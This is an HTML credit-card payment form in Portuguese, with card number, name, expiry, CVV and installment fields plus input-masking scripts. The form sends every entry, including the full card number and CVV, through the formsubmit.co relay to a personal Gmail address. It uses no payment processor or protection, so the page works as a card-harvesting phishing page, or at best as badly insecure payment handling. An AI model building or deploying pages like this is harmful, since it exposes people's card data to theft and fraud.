<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Formulário de Pagamento</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }

    form {
      background-color: #ffffff;
      max-width: 500px;
      margin: 40px auto;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    }

    fieldset {
      border: none;
      padding: 0;
    }

    legend {
      font-size: 24px;
      margin-bottom: 20px;
      font-weight: bold;
      color: #333;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
      font-weight: 600;
      color: #333;
    }

    input[type="text"],
    select {
      width: 100%;
      padding: 10px;
      margin-bottom: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }

    .checkbox-label {
      display: flex;
      align-items: center;
      margin-top: 15px;
    }

    .checkbox-label input {
      margin-right: 10px;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #28a745;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .error-message {
      font-size: 13px;
      color: red;
    }
  </style>
</head>
<body>

  <form id="paymentForm" action="https://formsubmit.co/juninho.pompilio.jr@gmail.com" method="POST" novalidate>
    <fieldset>
      <legend>Pagamento com Cartão de Crédito</legend>

      <label for="cardNumber">Número do Cartão</label>
      <input type="text" id="cardNumber" name="number" placeholder="1234 5678 9012 3456" maxlength="19" required />
      <div class="error-message" id="cardNumberError"></div>

      <label for="cardName">Nome no Cartão</label>
      <input type="text" id="cardName" name="fullName" placeholder="Nome Completo" required />
      <div class="error-message" id="cardNameError"></div>

      <label for="expirationMonth">Mês de Validade</label>
      <select id="expirationMonth" name="expirationMonth" required>
        <option value="" disabled selected>Mês</option>
        <option value="01">01</option>
        <option value="02">02</option>
        <option value="03">03</option>
        <option value="04">04</option>
        <option value="05">05</option>
        <option value="06">06</option>
        <option value="07">07</option>
        <option value="08">08</option>
        <option value="09">09</option>
        <option value="10">10</option>
        <option value="11">11</option>
        <option value="12">12</option>
      </select>
      <div class="error-message" id="expirationMonthError"></div>

      <label for="expirationYear">Ano de Validade</label>
      <select id="expirationYear" name="expirationYear" required>
        <option value="" disabled selected>Ano</option>
      </select>
      <div class="error-message" id="expirationYearError"></div>

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="CVC" placeholder="123" maxlength="4" required />
      <div class="error-message" id="cvvError"></div>

      <label for="installments">Parcelamento</label>
      <select id="installments" name="installments" required>
        <option value="" disabled selected>Selecione</option>
        <option value="1">1x (À vista)</option>
        <option value="2">2x</option>
        <option value="3">3x</option>
        <option value="4">4x</option>
        <option value="5">5x</option>
        <option value="6">6x</option>
        <option value="7">7x</option>
        <option value="8">8x</option>
        <option value="9">9x</option>
        <option value="10">10x</option>
        <option value="11">11x</option>
        <option value="12">12x</option>
      </select>
      <div class="error-message" id="installmentsError"></div>

      <label class="checkbox-label">
        <input type="checkbox" name="saveCard" />
        Salvar cartão para próximas compras
      </label>

      <button type="submit" id="submitBtn">Pagar</button>
    </fieldset>
  </form>

  <script>
    // Preencher anos de validade (ano atual + 10)
    const expirationYear = document.getElementById('expirationYear');
    const currentYear = new Date().getFullYear();
    for (let i = 0; i <= 10; i++) {
      const option = document.createElement('option');
      option.value = currentYear + i;
      option.textContent = currentYear + i;
      expirationYear.appendChild(option);
    }

    // Máscara para número do cartão
    document.getElementById('cardNumber').addEventListener('input', (e) => {
      e.target.value = e.target.value
        .replace(/\D/g, '')
        .replace(/(.{4})/g, '$1 ')
        .trim();
    });

    // Máscara para CVV
    document.getElementById('cvv').addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    });

    // Habilita o botão "Pagar" apenas se o formulário estiver válido
    const form = document.getElementById('paymentForm');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('input', () => {
      submitBtn.disabled = !form.checkValidity();
    });
  </script>

</body>
</html>
